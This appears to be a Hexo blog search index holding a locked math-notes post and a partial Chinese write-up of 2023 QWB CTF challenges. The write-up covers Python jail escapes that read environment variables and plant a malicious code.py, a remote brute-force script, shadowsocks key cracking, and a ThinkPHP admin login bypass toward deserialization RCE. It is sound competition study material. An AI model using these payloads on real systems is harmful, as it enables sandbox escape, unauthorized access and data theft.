<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>高数笔记</title>
    <link href="/2024/02/28/%E9%AB%98%E6%95%B0/"/>
    <url>/2024/02/28/%E9%AB%98%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误。" data-whm="此文章不能被修改。">  <script id="hbeData" type="hbeData" data-hmacdigest="e929a02d03e3ac54d337cdbb09fbb0afb8b965f01db564068bf9e33c1ec005c7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">考研专用</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>考研</category>
      
    </categories>
    
    
    <tags>
      
      <tag>高数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023第七届强网杯</title>
    <link href="/2024/01/10/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <url>/2024/01/10/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯">2023强网杯</h1><p>考完期末了有空更一下wp</p><h1 id="misc">MISC</h1><h2 id="pyjail-its-myfilter">Pyjail ! It's myFILTER !!!</h2><p>环境搭建</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">docker pull <span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><br>docker run -it -v /mnt/c/<span class="hljs-title class_">Users</span>/ddd/<span class="hljs-title class_">Desktop</span>/<span class="hljs-number">2023</span>qwb/misc/<span class="hljs-symbol">myFILTER:</span>/pyjail <span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># cd pyjail/</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/pyjail</span><span class="hljs-comment"># apt update</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/pyjail</span><span class="hljs-comment"># apt install python3</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/pyjail</span><span class="hljs-comment"># export FLAG=&quot;flag&#123;testflag&#125;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import code, os, subprocess<br>import pty<br>def blacklist_fun_callback(*args):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! It&#x27;s already banned!&quot;</span>)<br><br>pty.spawn = blacklist_fun_callback<br>os.system = blacklist_fun_callback<br>os.popen = blacklist_fun_callback<br>subprocess.Popen = blacklist_fun_callback<br>subprocess.call = blacklist_fun_callback<br>code.interacet = blacklist_fun_callback<br>code.compile_command = blacklist_fun_callback<br><br>vars = blacklist_fun_callback<br>attr = blacklist_fun_callback<br><span class="hljs-built_in">dir</span> = blacklist_fun_callback<br>getattr = blacklist_fun_callback<br><span class="hljs-built_in">exec</span> = blacklist_fun_callback<br>__import__ = blacklist_fun_callback<br>compile = blacklist_fun_callback<br>breakpoint = blacklist_fun_callback<br><br>del os, subprocess, code, pty, blacklist_fun_callback<br>input_code = input(<span class="hljs-string">&quot;Can u input your code to escape &gt; &quot;</span>)<br><br>blacklist_words = [<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>,<br>    <span class="hljs-string">&quot;interact&quot;</span>,<br>    <span class="hljs-string">&quot;pty&quot;</span>,<br>    <span class="hljs-string">&quot;pdb&quot;</span>,<br>    <span class="hljs-string">&quot;platform&quot;</span>,<br>    <span class="hljs-string">&quot;importlib&quot;</span>,<br>    <span class="hljs-string">&quot;timeit&quot;</span>,<br>    <span class="hljs-string">&quot;imp&quot;</span>,<br>    <span class="hljs-string">&quot;commands&quot;</span>,<br>    <span class="hljs-string">&quot;popen&quot;</span>,<br>    <span class="hljs-string">&quot;load_module&quot;</span>,<br>    <span class="hljs-string">&quot;spawn&quot;</span>,<br>    <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>    <span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;compile&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;vars&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>,<br>    <span class="hljs-string">&quot;dir&quot;</span>,<br>    <span class="hljs-string">&quot;getattr&quot;</span><br>    <span class="hljs-string">&quot;__import__&quot;</span>,<br>    <span class="hljs-string">&quot;__builtins__&quot;</span>,<br>    <span class="hljs-string">&quot;__getattribute__&quot;</span>,<br>    <span class="hljs-string">&quot;__class__&quot;</span>,<br>    <span class="hljs-string">&quot;__base__&quot;</span>,<br>    <span class="hljs-string">&quot;__subclasses__&quot;</span>,<br>    <span class="hljs-string">&quot;__getitem__&quot;</span>,<br>    <span class="hljs-string">&quot;__self__&quot;</span>,<br>    <span class="hljs-string">&quot;__globals__&quot;</span>,<br>    <span class="hljs-string">&quot;__init__&quot;</span>,<br>    <span class="hljs-string">&quot;__name__&quot;</span>,<br>    <span class="hljs-string">&quot;__dict__&quot;</span>,<br>    <span class="hljs-string">&quot;._module&quot;</span>,<br>    <span class="hljs-string">&quot;builtins&quot;</span>,<br>    <span class="hljs-string">&quot;breakpoint&quot;</span>,<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>]<br><br>def my_filter(input_code):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> blacklist_words:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> input_code:<br>            <span class="hljs-built_in">return</span> False<br>    <span class="hljs-built_in">return</span> True<br><br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> input_code and <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> input_code and input_code.isascii() and my_filter(input_code) and <span class="hljs-string">&quot;eval&quot;</span> not <span class="hljs-keyword">in</span> input_code and len(input_code) &lt; 65:<br>    input_code = <span class="hljs-built_in">eval</span>(f<span class="hljs-string">&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! Pleas.e obey the filter rules which I set!&quot;</span>)<br></code></pre></td></tr></table></figure><p>两层f，payload前面加个{}</p><p>open没有过滤，环境变量的flag没删除</p><p><code>&#123;print(open("/proc/self/environ").read())&#125;</code></p><figure><img src="/img/2023第七届强网杯/170482122320626.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="pyjail-its-myrevenge">Pyjail ! It's myRevenge !!!</h2><p>跟前面差不多，删除了环境变量，删掉了pty库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import code, os, subprocess<br><br>def blacklist_fun_callback(*args):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! It&#x27;s already banned!&quot;</span>)<br><br>os.system = blacklist_fun_callback<br>os.popen = blacklist_fun_callback<br>subprocess.Popen = blacklist_fun_callback<br>subprocess.call = blacklist_fun_callback<br>code.interact = blacklist_fun_callback<br>code.compile_command = blacklist_fun_callback<br><br>vars = blacklist_fun_callback<br>attr = blacklist_fun_callback<br><span class="hljs-built_in">dir</span> = blacklist_fun_callback<br>getattr = blacklist_fun_callback<br><span class="hljs-built_in">exec</span> = blacklist_fun_callback<br>__import__ = blacklist_fun_callback<br>compile = blacklist_fun_callback<br>breakpoint = blacklist_fun_callback<br><br>del os, subprocess, code, blacklist_fun_callback<br>input_code = input(<span class="hljs-string">&quot;Can u input your code to escape &gt; &quot;</span>)<br>blacklist_words_var_name_fake_in_local_real_in_remote = [<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>,<br>    <span class="hljs-string">&quot;interact&quot;</span>,<br>    <span class="hljs-string">&quot;pty&quot;</span>,<br>    <span class="hljs-string">&quot;pdb&quot;</span>,<br>    <span class="hljs-string">&quot;platform&quot;</span>,<br>    <span class="hljs-string">&quot;importlib&quot;</span>,<br>    <span class="hljs-string">&quot;timeit&quot;</span>,<br>    <span class="hljs-string">&quot;imp&quot;</span>,<br>    <span class="hljs-string">&quot;commands&quot;</span>,<br>    <span class="hljs-string">&quot;popen&quot;</span>,<br>    <span class="hljs-string">&quot;load_module&quot;</span>,<br>    <span class="hljs-string">&quot;spawn&quot;</span>,<br>    <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>    <span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;compile&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;vars&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>,<br>    <span class="hljs-string">&quot;dir&quot;</span>,<br>    <span class="hljs-string">&quot;getattr&quot;</span><br>    <span class="hljs-string">&quot;__import__&quot;</span>,<br>    <span class="hljs-string">&quot;__builtins__&quot;</span>,<br>    <span class="hljs-string">&quot;__getattribute__&quot;</span>,<br>    <span class="hljs-string">&quot;__class__&quot;</span>,<br>    <span class="hljs-string">&quot;__base__&quot;</span>,<br>    <span class="hljs-string">&quot;__subclasses__&quot;</span>,<br>    <span class="hljs-string">&quot;__getitem__&quot;</span>,<br>    <span class="hljs-string">&quot;__self__&quot;</span>,<br>    <span class="hljs-string">&quot;__globals__&quot;</span>,<br>    <span class="hljs-string">&quot;__init__&quot;</span>,<br>    <span class="hljs-string">&quot;__name__&quot;</span>,<br>    <span class="hljs-string">&quot;__dict__&quot;</span>,<br>    <span class="hljs-string">&quot;._module&quot;</span>,<br>    <span class="hljs-string">&quot;builtins&quot;</span>,<br>    <span class="hljs-string">&quot;breakpoint&quot;</span>,<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>]<br><br>def my_filter(input_code):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> blacklist_words_var_name_fake_in_local_real_in_remote:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> input_code:<br>            <span class="hljs-built_in">print</span>(x)<br>            <span class="hljs-built_in">return</span> False<br>    <span class="hljs-built_in">return</span> True<br><br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> input_code and <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> input_code and input_code.isascii() and my_filter(<br>        input_code) and <span class="hljs-string">&quot;eval&quot;</span> not <span class="hljs-keyword">in</span> input_code and len(input_code) &lt; 65:<br>    input_code = <span class="hljs-built_in">eval</span>(f<span class="hljs-string">&quot;f&#x27;&#123;input_code&#125;&#x27;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(input_code)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! Please obey the filter rules which I set!&quot;</span>)<br></code></pre></td></tr></table></figure><p>有很多个思路，这里给出几个</p><ol type="1"><li>写读文件的命令到1，执行1写入2，读取2(这种好像不行)</li><li>清除blacklist/覆盖filter函数，然后继续input</li><li>写入code/os/subprocess模块为恶意文件，题目importcode后直接调用读flag</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>).write(<span class="hljs-string">&quot;im&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;port&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot; o&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;s;o&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;s.syste&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;m(&quot;</span>+chr(34)+<span class="hljs-string">&quot;cat f* &gt; 2&quot;</span>+chr(34)+<span class="hljs-string">&quot;)&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;co&quot;</span>+<span class="hljs-string">&quot;de.py&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(open(<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-built_in">read</span>())&#125;<br>&#123;<span class="hljs-built_in">print</span>(open(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).<span class="hljs-built_in">read</span>())&#125;<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231721.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="easyfuzz">easyfuzz</h2><p>不懂给了个附件有什么用，纯脑洞题</p><p>爆破9位</p><p>前两位可以为任意数，返回110000000</p><p>然后后面像glob协议一样逐位爆破数字+大小写字母</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>ip = <span class="hljs-string">&quot;101.200.122.251&quot;</span><br>port = <span class="hljs-number">12177</span><br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>io = remote(ip, port)<br><br>charset = string.digits + string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Enter a string (should be less than 10 bytes): &quot;</span>)<br>    io.sendline(payload)<br>    <span class="hljs-keyword">return</span> io.recvline()[-<span class="hljs-number">10</span>:-<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force</span>():<br>    password = [<span class="hljs-string">&#x27;0&#x27;</span>] * <span class="hljs-number">9</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> charset:<br>            <span class="hljs-comment"># Try the character in the current position</span><br>            password[i] = char<br>            payload = <span class="hljs-string">&quot;&quot;</span>.join(password)<br><br>            <span class="hljs-comment"># Send the payload and get the response</span><br>            response = send_payload(payload)<br><br>            <span class="hljs-comment"># Check if the guessed character is correct (1 in the response)</span><br>            <span class="hljs-keyword">if</span> response[i] == <span class="hljs-number">49</span>:<br>                <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(password)<br><br>result = brute_force()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found password: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="谍影重重2.0">谍影重重2.0</h2><blockquote><p>小明是某间谍组织的一员，他终日监听着我国某重点军事基地的飞行动态，妄图通过分析参数找到我国飞的最快的飞机。我国费尽千辛万苦抓住了他，并在他的电脑上找到了一段他监听的信息，请分析出这段信息中飞的最快的飞机。</p><p>格式为flag{md5(ICAO CODE of the fastest plane)}</p><p>附件内所涉及的信息均为公开信息，题目描述也均为虚构，切勿当真</p></blockquote><p>ADS-B</p><p><code>tshark -r attach.pcapng -T fields -e "tcp.payload" &gt; payload.txt</code></p><p>https://github.com/junzis/pyModeS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import pyModeS as pms<br><br>with open(<span class="hljs-string">&#x27;payload.txt&#x27;</span>) as f:<br>    res = f.read().<span class="hljs-built_in">split</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-keyword">if</span> len(i) == 46:<br>        pms.tell(i[18:])<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231722.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/17048212231723.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag为md5('79a05e')</p><p>更多可以参考https://www.cnblogs.com/lynnzixing/p/17912999.html</p><h2 id="谍影重重3.0">谍影重重3.0</h2><blockquote><p>小明被我国抓获之后对所作所为供认不讳，在对他个人电脑监控的过程中，发现存在通过特殊隧道获取境外组织下发的任务文件，请你协助分析出他所获取到的任务文件名称。</p><p>flag提交格式为flag{md5(文件名)}</p><p>附件内所涉及的信息均为公开信息，题目描述也均为虚构内容，如有雷同，切勿当真！</p></blockquote><p>纸飞机、境外 -&gt; shadowsocks</p><p>参考： https://phuker.github.io/posts/shadowsocks-active-probing.htmlhttps://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p><p>需要爆破密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import hashlib<br>from Crypto.Cipher import AES<br><br>def EVP_BytesToKey(password, key_len, iv_len):<br>    <span class="hljs-comment"># equivalent to OpenSSL&#x27;s EVP_BytesToKey() with count 1</span><br>    <span class="hljs-comment"># so that we make the same key and iv as nodejs version</span><br>    <span class="hljs-keyword">if</span> hasattr(password, <span class="hljs-string">&#x27;encode&#x27;</span>):<br>        password = password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment"># cached_key = &#x27;%s-%d-%d&#x27; % (password, key_len, iv_len)</span><br>    <span class="hljs-comment"># r = cached_keys.get(cached_key, None)</span><br>    <span class="hljs-comment"># if r:</span><br>        <span class="hljs-comment"># return r</span><br>    m = []<br>    i = 0<br>    <span class="hljs-keyword">while</span> len(b<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(m)) &lt; (key_len + iv_len):<br>        md5 = hashlib.md5()<br>        data = password<br>        <span class="hljs-keyword">if</span> i &gt; 0:<br>            data = m[i - 1] + password<br>        md5.update(data)<br>        m.append(md5.digest())<br>        i += 1<br>    ms = b<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(m)<br>    key = ms[:key_len]<br>    iv = ms[key_len:key_len + iv_len]<br>    <span class="hljs-comment"># cached_keys[cached_key] = (key, iv)</span><br>    <span class="hljs-built_in">return</span> key, iv<br><br>def decrypt(cipher,password):<br>    key_len = int(256/8)<br>    iv_len = 16<br>    key, _ = EVP_BytesToKey(password, key_len, iv_len)<br>    cipher = bytes.fromhex(cipher)<br>    iv = cipher[:iv_len]<br>    real_cipher = cipher[iv_len:]<br>    obj = AES.new(key, AES.MODE_CFB, iv, segment_size=128)<br>    plain = obj.decrypt(real_cipher)<br>    <span class="hljs-built_in">return</span> plain<br><br><span class="hljs-comment">#tcp原始hex数据</span><br>req_cipher = <span class="hljs-string">&#x27;&#x27;</span><br>res_cipher = <span class="hljs-string">&#x27;&#x27;</span><br><br>with open(<span class="hljs-string">&#x27;password.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    passwords = f.readlines()<br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    password.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    req_plain = decrypt(req_cipher,password)<br>    res_plain = decrypt(res_cipher,password)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;HTTP&#x27;</span> <span class="hljs-keyword">in</span> req_plain:<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;password:&#123;password&#125;&quot;</span>,f<span class="hljs-string">&quot;\nreq_plain:&#123;req_plain&#125;&quot;</span>,f<span class="hljs-string">&quot;\nres_plain:&#123;res_plain&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231724.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag为md5('Why-do-you-want-to-know-what-this-is')</p><h1 id="web">WEB</h1><h2 id="happygame">happygame</h2><p>nc返回一些字节，然后可以输入，返回</p><p><code>HTTP/2 client preface string missing or corrupt. Hex dump for received bytes`` xxx</code></p><p>搜索一下发现是grpc服务</p><figure><img src="/img/2023第七届强网杯/17048212231725.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>grpcui本地启动，ProcessMsg方法有参数serializeData</p><p>java反序列化cc链，目前见过可以的有cc1、6、7</p><h2 id="thinkshop">thinkshop</h2><p>按照题目本地起一个docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">docker load &lt; thinkshop.tar<br>docker run -tid --name thinkshop -p 36000:80 -e FLAG=flag&#123;test_flag&#125; thinkshop<br></code></pre></td></tr></table></figure><p>thinkphp5.0.23，目录结构如下</p><figure><img src="/img/2023第七届强网杯/17048212231726.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Admin.php有登录功能</p><p>根目录下有shop.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Records of admin</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `admin` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>);<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/17048212231737.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>正常应该是admin;123456登录，但是传入的username直接放到了find方法的参数中</p><p>thinkphp5.x在find有参数的情况下，默认会去找数据表中的主键列，所以这里使用1;123456登录后台</p><p>定位到<code>application/index/view/admin/goods_edit.html</code></p><p>将data数据反序列化，可以打tp5的反序列化链rce</p><figure><img src="/img/2023第七届强网杯/17048212231738.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Admin.php的do_edit方法，将data传入saveGood处理</p><figure><img src="/img/2023第七届强网杯/17048212231739.png" alt="img" /><figcaption 